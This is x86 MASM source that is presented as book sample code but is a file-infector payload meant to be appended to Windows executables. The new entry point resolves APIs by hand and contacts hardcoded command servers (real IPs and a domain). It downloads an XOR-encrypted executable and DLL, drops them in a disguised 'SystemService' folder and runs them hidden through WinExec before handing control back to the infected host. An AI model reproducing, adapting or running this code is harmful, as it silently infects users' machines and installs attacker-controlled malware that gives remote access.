;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; Sample code for < Win32ASM Programming 2nd Edition>
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; 要被添加到目标文件后面的执行代码
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; 一些函数的原形定义
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

include 	ws2_32.inc

_ProtoRtlGetLastWin32Error	typedef proto
_ProtoVirtualAlloc		typedef proto 	:dword,:dword,:dword,:dword
_ProtoVirtualFree		typedef proto	:dword,:dword,:dword
_ProtolstrcatA			typedef	proto	:dword,:dword
_ProtolstrlenA			typedef	proto	:dword
_ProtolstrcpyA			typedef proto  	:dword,:dword
_ProtoGetProcAddress	typedef	proto	:dword,:dword
_ProtoLoadLibrary		typedef	proto	:dword
_ProtoMessageBoxA		typedef	proto	:dword,:dword,:dword,:dword
_ProtowsprintfA			typedef proto	:dword,:dword,:dword
_ProtoNetWkstaGetInfo	typedef proto	:dword,:dword,:dword
_ProtoNetApiBufferFree	typedef	proto	:dword
_ProtoWSAStartup		typedef proto 	:dword,:dword
_Protontohs				typedef	proto 	:dword
_Protoinet_addr			typedef	proto	:dword
_Protosocket			typedef	proto	:dword,:dword,:dword
_Protoconnect			typedef	proto 	:dword,:dword,:dword	
_Protosend				typedef	proto	:dword,:dword,:dword,:dword
_Protorecv				typedef	proto	:dword,:dword,:dword,:dword
_Protogethostbyname		typedef proto	:dword
_Protoclosesocket		typedef proto	:dword
_ProtoCreateFileA		typedef	proto	:dword,:dword,:dword,:dword,:dword,:dword,:dword
_ProtoWriteFile			typedef	proto	:dword,:dword,:dword,:dword,:dword
_ProtoCloseHandle		typedef	proto	:dword
_ProtoWinExec			typedef proto 	:dword,:dword
_ProtoGetUserNameA		typedef proto	:dword,:dword
_ProtoShellExecuteA		typedef proto	:dword,:dword,:dword,:dword,:dword,:dword
_ProtoMakeSureDirectoryPathExists	typedef proto	:dword


_ApiRtlGetLastWin32Error typedef ptr _ProtoRtlGetLastWin32Error
_ApiVirtualAlloc		typedef ptr _ProtoVirtualAlloc
_ApiVirtualFree			typedef ptr _ProtoVirtualFree
_ApilstrcatA			typedef	ptr	_ProtolstrcatA
_ApilstrlenA			typedef	ptr	_ProtolstrlenA
_ApilstrcpyA			typedef ptr _ProtolstrcpyA
_ApiwsprintfA			typedef ptr _ProtowsprintfA
_ApiGetProcAddress		typedef	ptr	_ProtoGetProcAddress
_ApiLoadLibrary			typedef	ptr	_ProtoLoadLibrary
_ApiMessageBoxA			typedef	ptr	_ProtoMessageBoxA
_ApiWSAStartup			typedef ptr _ProtoWSAStartup
_Apintohs				typedef	ptr	_Protontohs
_Apiinet_addr			typedef	ptr	_Protoinet_addr
_Apisocket				typedef	ptr	_Protosocket
_Apiconnect				typedef	ptr	_Protoconnect	
_Apisend				typedef	ptr	_Protosend
_Apirecv				typedef	ptr	_Protorecv
_Apigethostbyname		typedef ptr _Protogethostbyname
_Apiclosesocket			typedef ptr _Protoclosesocket
_ApiCreateFileA			typedef	ptr	_ProtoCreateFileA
_ApiWriteFile			typedef	ptr	_ProtoWriteFile
_ApiCloseHandle			typedef	ptr	_ProtoCloseHandle
_ApiWinExec				typedef ptr _ProtoWinExec
_ApiMakeSureDirectoryPathExists	typedef ptr _ProtoMakeSureDirectoryPathExists
_ApiGetUserNameA		typedef ptr _ProtoGetUserNameA
_ApiShellExecuteA		typedef ptr _ProtoShellExecuteA
_ApiNetWkstaGetInfo		typedef ptr _ProtoNetWkstaGetInfo
_ApiNetApiBufferFree 	typedef ptr _ProtoNetApiBufferFree
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



APPEND_CODE	equ	this byte
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; 被添加到目标文件中的代码从这里开始
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
include		_GetKernel.asm

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


MAX_RECVBUFFER_SIZE	EQU 200000h
WSA_VERSION			EQU 0202h
SERVER_PORT			EQU 2002
CRYPT_KEY_SIZE		EQU 16
SERVER_HOST_IP 		EQU 0
SERVER_HOST_URL 	EQU 0
ifdef SERVER_HOST_URL
;szServerHost		db 'www.eyw168.com',0
szServerHost		db 'www.liujinguangsdm.xyz',0
;szServerBakeHost	db 'www.liujinguangsdn.top',0
endif

ifdef SERVER_HOST_IP
szServerIP			db '182.110.69.39',0
;szServerIP			db '115.236.49.68',0
;szServerIP			db '47.96.17.237',0
;szServerIP			db '1.32.216.22',0
;szServerIP			db '1.32.200.51',0
;szServerIP			db '192.168.3.129',0
endif

szUser32			db	'user32',0
szWS2_32			db 	'ws2_32',0
szDbghelp 			db 	'dbghelp',0
szShell32			db	'shell32',0
szAdvapi32			db	'advapi32',0
szNetapi32			db 	'netapi32',0
szNtdll				db	'ntdll',0


szGetUserNameA		db 	'GetUserNameA',0
szShellExecuteA 	db  'ShellExecuteA',0
szMakeSureDirectoryPathExists db 'MakeSureDirectoryPathExists',0
szRtlGetLastWin32Error	db 'RtlGetLastWin32Error',0
szLoadLibrary		db	'LoadLibraryA',0
szGetProcAddress 	db	'GetProcAddress',0
szNetWkstaGetInfo	db 	'NetWkstaGetInfo',0
szNetApiBufferFree 	db 	'NetApiBufferFree',0
szMessageBoxA		db	'MessageBoxA',0
szWSAStartup		db 	'WSAStartup',0
szntohs				db 	'ntohs',0
szinet_addr			db 	'inet_addr',0
szsocket			db 	'socket',0
szconnect			db	'connect',0
szsend				db	'send',0
szrecv				db 	'recv',0
szgethostbyname		db 	'gethostbyname',0
szclosesocket		db	'closesocket',0
szwsprintfA			db	'wsprintfA',0
szCreateFileA		db	'CreateFileA',0
szWriteFile			db	'WriteFile',0
szCloseHandle		db	'CloseHandle',0
szWinExec			db 	'WinExec',0
szVirtualAlloc		db	'VirtualAlloc',0
szVirtualFree		db	'VirtualFree',0
szlstrlenA			db	'lstrlenA',0
szlstrcatA			db 	'lstrcatA',0
szlstrcpyA			db 	'lstrcpyA',0
szVistaAbovePathFormat	db	'c:\users\%s\appdata\local\SystemService\',0
szXPPathFormat			db	'c:\documents and settings\%s\local settings\SystemService\',0
szQuatationFormat	db	'"%s" "%s"',0
szLoadProgramCmd	db	'GET /test20190701/myshelldll.exe HTTP/1.1',0dh,0ah
						'User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi 4A MIUI/V10.2.1.0.MCCCNXM)',0dh,0ah
						'Host: 47.101.189.13',0dh,0ah
						'Connection: Keep-Alive',0dh,0ah
						'Accept-Encoding: gzip',',0dh,0ah,0dh,0ah,0
szShellExecuteAOpen	db 	'open',0
szShellExecuteAParam db 'STARTFIRSTTIME',0







;********************************************************************
; 新的入口地址
;********************************************************************
_NewEntry proc
;********************************************************************
; 重定位并获取一些 API 的入口地址
;********************************************************************
		local szUserName[32]:byte
		local szExePath[128]:byte
		local szDllPath[128]:byte
		local szWhiteExeName[32]:byte
		local szBlackDllName[32]:byte
		local lpProgramBuf		
		local dwRecvLen		
		local socketServer		
		local iCount				
		local LPWKSTA_INFO_100	
		local sockaddrServer:sockaddr_in
		local WsaData:WSADATA		
		local hDllWS2_32 							
		local hDllKernel32					
		local hDllUser32					
		local hDllShell32						
		local hDllAdvapi32					
		local hDllDbghelp						
		local hDllNetapi32					
		local hDLlNtdll					

		local _RtlGetLastWin32Error: 	_ApiRtlGetLastWin32Error 
		local _VirtualAlloc:			_ApiVirtualAlloc		
		local _VirtualFree:				_ApiVirtualFree			
		local _lstrcatA:				_ApilstrcatA			
		local _lstrlenA:				_ApilstrlenA			
		local _lstrcpyA:				_ApilstrcpyA			
		local _GetProcAddress:			_ApiGetProcAddress		
		local _LoadLibrary:				_ApiLoadLibrary			
		local _MessageBoxA:				_ApiMessageBoxA			
		local _wsprintfA:				_ApiwsprintfA			
		local _WSAStartup:				_ApiWSAStartup			
		local _ntohs:					_Apintohs				
		local _inet_addr:				_Apiinet_addr			
		local _socket:					_Apisocket				
		local _connect:					_Apiconnect				
		local _send:					_Apisend				
		local _recv:					_Apirecv				
		local _gethostbyname:			_Apigethostbyname		
		local _closesocket:				_Apiclosesocket			
		local _CreateFileA:			 	_ApiCreateFileA			
		local _WriteFile: 				_ApiWriteFile			
		local _CloseHandle: 			_ApiCloseHandle			
		local _WinExec:					_ApiWinExec				
		local _GetUserNameA:			_ApiGetUserNameA		
		local _ShellExecuteA:			_ApiShellExecuteA		
		local _MakeSureDirectoryPathExists: 	_ApiMakeSureDirectoryPathExists 
		local _NetWkstaGetInfo:					_ApiNetWkstaGetInfo		
		local _NetApiBufferFree:				_ApiNetApiBufferFree 
	
		pushad
		jmp _Confusion
		dd 067452301h
		dd 0fecdab89h
_Confusion:
		call	@F
		@@:
		pop	ebx
		sub	ebx,offset @B	
		
;********************************************************************
		invoke	_GetKernelBase,[ebp+4]	;获取Kernel32.dll基址
		.if	! eax
			jmp	_JmpOldEntry
		.endif
		mov	hDllKernel32,eax	;获取GetProcAddress入口
		
		lea	eax,[ebx+szGetProcAddress]
		invoke	_GetApi,hDllKernel32,eax
		mov	_GetProcAddress,eax
		
		lea	eax,[ebx+szLoadLibrary]	;获取LoadLibrary入口
		invoke	_GetProcAddress,hDllKernel32,eax
		mov	_LoadLibrary,eax

		lea	eax,[ebx+szCreateFileA]
		invoke	_GetApi,hDllKernel32,eax
		mov	_CreateFileA,eax
		
		lea	eax,[ebx+szWriteFile]
		invoke	_GetApi,hDllKernel32,eax
		mov	_WriteFile,eax
		
		lea	eax,[ebx+szCloseHandle]
		invoke	_GetApi,hDllKernel32,eax
		mov	_CloseHandle,eax
		
		lea	eax,[ebx+szVirtualAlloc]
		invoke	_GetApi,hDllKernel32,eax
		mov	_VirtualAlloc,eax
		
		lea	eax,[ebx+szVirtualFree]
		invoke	_GetApi,hDllKernel32,eax
		mov	_VirtualFree,eax
		
		lea	eax,[ebx+szlstrcatA]
		invoke	_GetApi,hDllKernel32,eax
		mov	_lstrcatA,eax
		
		lea	eax,[ebx+szlstrlenA]
		invoke	_GetApi,hDllKernel32,eax
		mov	_lstrlenA,eax
		
		lea	eax,[ebx+szlstrcpyA]
		invoke	_GetApi,hDllKernel32,eax
		mov	_lstrcpyA,eax
		
		lea	eax,[ebx+szWinExec]
		invoke	_GetApi,hDllKernel32,eax
		mov	_WinExec,eax
;********************************************************************
		lea	eax,[ebx+szWS2_32]	;获取ws2_32.dll基址
		invoke	_LoadLibrary,eax
		mov	hDllWS2_32,eax
		
		lea	eax,[ebx+szWSAStartup]	
		invoke	_GetProcAddress,hDllWS2_32,eax
		mov	_WSAStartup,eax
		
		lea	eax,[ebx+szntohs]	
		invoke	_GetProcAddress,hDllWS2_32,eax
		mov	_ntohs,eax
		
		lea	eax,[ebx+szinet_addr]	
		invoke	_GetProcAddress,hDllWS2_32,eax
		mov	_inet_addr,eax
		
		lea	eax,[ebx+szsocket]	
		invoke	_GetProcAddress,hDllWS2_32,eax
		mov	_socket,eax
		
		lea	eax,[ebx+szconnect]	
		invoke	_GetProcAddress,hDllWS2_32,eax
		mov	_connect,eax
		
		lea	eax,[ebx+szsend]	
		invoke	_GetProcAddress,hDllWS2_32,eax
		mov	_send,eax
		
		lea	eax,[ebx+szrecv]	
		invoke	_GetProcAddress,hDllWS2_32,eax
		mov	_recv,eax
		
		lea	eax,[ebx+szclosesocket]	
		invoke	_GetProcAddress,hDllWS2_32,eax
		mov	_closesocket,eax
		
		lea	eax,[ebx+szgethostbyname]	
		invoke	_GetProcAddress,hDllWS2_32,eax
		mov	_gethostbyname,eax
		
;********************************************************************		
		lea	eax,[ebx+szUser32]	;获取User32.dll基址
		invoke	_LoadLibrary,eax
		mov	hDllUser32,eax
		
		lea	eax,[ebx+szwsprintfA]
		invoke	_GetProcAddress,hDllUser32,eax
		mov	_wsprintfA,eax
		
		lea	eax,[ebx+szMessageBoxA]	;获取MessageBox入口
		invoke	_GetProcAddress,hDllUser32,eax
		mov	_MessageBoxA,eax	
;********************************************************************
		lea	eax,[ebx+szDbghelp]
		invoke	_LoadLibrary,eax
		mov	hDllDbghelp,eax
		
		lea	eax,[ebx+szMakeSureDirectoryPathExists]	
		invoke	_GetProcAddress,hDllDbghelp,eax
		mov	_MakeSureDirectoryPathExists,eax	
;********************************************************************
		lea	eax,[ebx+szShell32]
		invoke	_LoadLibrary,eax
		mov	hDllShell32,eax
		lea	eax,[ebx+szShellExecuteA]	
		invoke	_GetProcAddress,hDllShell32,eax
		mov	_ShellExecuteA,eax	
;********************************************************************		
		lea	eax,[ebx+szAdvapi32]
		invoke	_LoadLibrary,eax
		mov	hDllAdvapi32,eax
		lea	eax,[ebx+szGetUserNameA]	
		invoke	_GetProcAddress,hDllAdvapi32,eax
		mov	_GetUserNameA,eax	
;********************************************************************		
		lea	eax,[ebx+szNtdll]
		invoke	_LoadLibrary,eax
		mov	hDLlNtdll,eax
		lea	eax,[ebx+szRtlGetLastWin32Error]	
		invoke	_GetProcAddress,hDLlNtdll,eax
		mov	_RtlGetLastWin32Error,eax	
;********************************************************************			
		mov dword ptr iCount,sizeof szUserName
		lea ecx,iCount
		lea	eax,szUserName
		invoke	_GetUserNameA,eax,ecx
		;lea	ecx,[ebx+szUserName]
		;lea	eax,[ebx+szUserName]
		;invoke	[ebx+_MessageBoxA],NULL,ecx,eax,MB_YESNO or MB_ICONQUESTION

		lea	eax,[ebx+szNetapi32]
		invoke	_LoadLibrary,eax
		mov	hDllNetapi32,eax
		lea	eax,[ebx+szNetWkstaGetInfo]	
		invoke	_GetProcAddress,hDllNetapi32,eax
		mov	_NetWkstaGetInfo,eax	
		lea	eax,[ebx+szNetApiBufferFree]	
		invoke	_GetProcAddress,hDllNetapi32,eax
		mov	_NetApiBufferFree,eax	
		
		lea eax,LPWKSTA_INFO_100
		invoke	_NetWkstaGetInfo,0,100,eax
		mov esi,LPWKSTA_INFO_100
		mov eax,[esi+12]
		mov ecx,[esi + 16]
		and eax,0ffffh
		shl eax,16
		and ecx,0ffffh
		or eax,ecx
		.if eax >= 60000h 
			lea eax,szExePath
			lea ecx,[ebx+szVistaAbovePathFormat]
			lea edx,szUserName
			invoke _wsprintfA,eax,ecx,edx
			add esp,12
		.elseif eax < 60000h
			lea eax,szExePath
			lea ecx,[ebx+szXPPathFormat]
			lea edx,szUserName
			invoke _wsprintfA,eax,ecx,edx
			add esp,12
		.else
			jmp	_JmpOldEntry
		.endif
		
		;lea	ecx,[ebx+szExePath]
		;lea	eax,[ebx+szExePath]
		;invoke	[ebx+_MessageBoxA],NULL,ecx,eax,MB_YESNO or MB_ICONQUESTION
		lea eax,LPWKSTA_INFO_100
		invoke _NetApiBufferFree,eax
;********************************************************************
		lea eax,szExePath
		invoke _MakeSureDirectoryPathExists,eax

		lea eax,WsaData
		invoke _WSAStartup,WSA_VERSION,eax
		.if eax != 0
			jmp	_JmpOldEntry
		.endif
		
		invoke _socket,AF_INET,SOCK_STREAM,IPPROTO_TCP
		.if eax == INVALID_SOCKET
			jmp	_JmpOldEntry
		.endif
		mov socketServer,eax
		
		lea esi,sockaddrServer
		mov word ptr [esi],AF_INET
		invoke _ntohs,SERVER_PORT
		mov word ptr [esi+2],ax
ifdef SERVER_HOST_IP
		lea eax,[ebx+szServerIP]
		invoke _inet_addr,eax
		mov dword ptr [esi+4],eax
else
		lea eax,[ebx+szServerHost]
		invoke _gethostbyname,eax
		mov eax,[eax + 12]
		mov eax,[eax]
		mov eax,[eax]
		mov dword ptr [esi+4],eax
endif
		
		
		lea eax,sockaddrServer
		invoke _connect,socketServer,eax,sizeof sockaddr_in
		.if eax == INVALID_SOCKET
			invoke _closesocket,socketServer
			;invoke _RtlGetLastWin32Error
			jmp	_JmpOldEntry
		.endif

		lea eax,[ebx+szLoadProgramCmd]
		invoke _send,socketServer,eax,sizeof szLoadProgramCmd - 1,0
		.if eax <= 0
			invoke _closesocket,socketServer
			;invoke _RtlGetLastWin32Error
			jmp	_JmpOldEntry
		.endif
		
		mov iCount,MAX_RECVBUFFER_SIZE
		invoke _VirtualAlloc,0,iCount,MEM_COMMIT,PAGE_READWRITE
		.if eax == 0
			invoke _closesocket,socketServer
			jmp	_JmpOldEntry
		.endif
		mov lpProgramBuf,eax
		
		mov edi,lpProgramBuf
		mov dwRecvLen,0
_RECVDATAFROMSERVER:
		invoke _recv,socketServer,edi,iCount,0
		.if eax <= 0
			invoke _closesocket,socketServer
			jmp	_FreeBufAndJumpOld
		.endif
		add dwRecvLen,eax
		mov esi,lpProgramBuf
		mov ecx,[esi]
		.if dwRecvLen < ecx
			sub iCount,eax
			add edi,eax
			jmp _RECVDATAFROMSERVER
		.endif
		
		invoke _closesocket,socketServer
		
		mov edx,4
		add edx,4
		mov esi,lpProgramBuf
		add esi,edx
		mov ecx,[esi]
		add esi,4
		lea edi,szWhiteExeName
_GetExeName:
		mov al,[esi]
		mov [edi],al
		inc esi
		inc edi
		dec ecx
		.if ecx !=0 
			jmp _GetExeName
		.endif
		mov ecx,[esi]
		add esi,4
		push esi
		push ecx
		mov edi,lpProgramBuf
		add edi,dwRecvLen
		sub edi,CRYPT_KEY_SIZE
		mov edx,0
_DecryptWhiteExe:
		mov al,[esi]
		xor al,[edi+edx]
		mov [esi],al
		inc esi
		inc edx
		.if edx == CRYPT_KEY_SIZE
			mov edx,0
		.endif
		dec ecx
		.if ecx != 0
			jmp _DecryptWhiteExe
		.endif


		lea eax,szExePath
		lea ecx,szDllPath
		invoke _lstrcpyA,ecx,eax
		
		lea eax,szExePath
		lea ecx,szWhiteExeName
		invoke _lstrcatA,eax,ecx

		lea edi,szExePath
		invoke _CreateFileA,edi,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
		.if eax == INVALID_HANDLE_VALUE
			jmp _FreeBufAndJumpOld
		.endif
		mov edx,eax
		
		pop ecx
		pop esi
		push ecx
		push esi
		lea eax,iCount
		push edx
		invoke _WriteFile,edx,esi,ecx,eax,0
		pop edx
		invoke _CloseHandle,edx

		pop esi
		pop ecx
		add esi,ecx
		mov ecx,[esi]
		add esi,4
		lea edi,szBlackDllName
_GetDllName:
		mov al,[esi]
		mov [edi],al
		inc esi
		inc edi
		dec ecx
		.if ecx !=0 
			jmp _GetDllName
		.endif
		mov ecx,[esi]
		add esi,4

		push esi
		push ecx
		mov edi,lpProgramBuf
		add edi,dwRecvLen
		sub edi,CRYPT_KEY_SIZE
		mov edx,0
_DecryptBlackDll:
		mov al,[esi]
		xor al,[edi+edx]
		mov [esi],al
		inc esi
		inc edx
		.if edx == CRYPT_KEY_SIZE
			mov edx,0
		.endif
		dec ecx
		.if ecx != 0
			jmp _DecryptBlackDll
		.endif

		lea eax,szDllPath
		lea ecx,szBlackDllName
		invoke _lstrcatA,eax,ecx
		lea edi,szDllPath
		invoke _CreateFileA,edi,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
		.if eax == INVALID_HANDLE_VALUE
			jmp _FreeBufAndJumpOld
		.endif
		mov edx,eax
		
		pop ecx
		pop esi
		lea eax,iCount
		push edx
		invoke _WriteFile,edx,esi,ecx,eax,0
		pop edx
		invoke _CloseHandle,edx
		


		lea esi,[ebx+szShellExecuteAParam]
		push esi
		lea edx,szExePath
		push edx
		lea ecx,[ebx+szQuatationFormat]
		push ecx
		lea eax,szDllPath
		push eax
		;invoke [ebx+_wsprintfA],eax,ecx,edx,esi
		call _wsprintfA
		add esp,16

		;lea	eax,[ebx+szDllPath]
		;invoke	[ebx+_MessageBoxA],NULL,eax,eax,MB_YESNO or MB_ICONQUESTION
		
		;lea eax,[ebx+szShellExecuteAOpen]
		;lea ecx,[ebx+szDllPath]
		;lea edx,[ebx+szShellExecuteAParam]
		;invoke [ebx+_ShellExecuteA],0,eax,ecx,edx,0,SW_HIDE
		lea eax,szDllPath
		invoke _WinExec,eax,SW_HIDE
		
_FreeBufAndJumpOld:		
		invoke _VirtualFree,lpProgramBuf,MAX_RECVBUFFER_SIZE,MEM_DECOMMIT
		invoke _VirtualFree,lpProgramBuf,0,MEM_RELEASE
		
_JmpOldEntry:
		popad
		mov esp,ebp
		pop ebp
		jmp _ToOldEntry

_NewEntry endp
;********************************************************************
; 执行原来的文件
;********************************************************************
_ToOldEntry:
		db	0e9h	;0e9h是jmp xxxxxxxx的机器码
_dwOldEntry:
		dd	?	;用来填入原来的入口地址
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

APPEND_CODE_END	equ	this byte
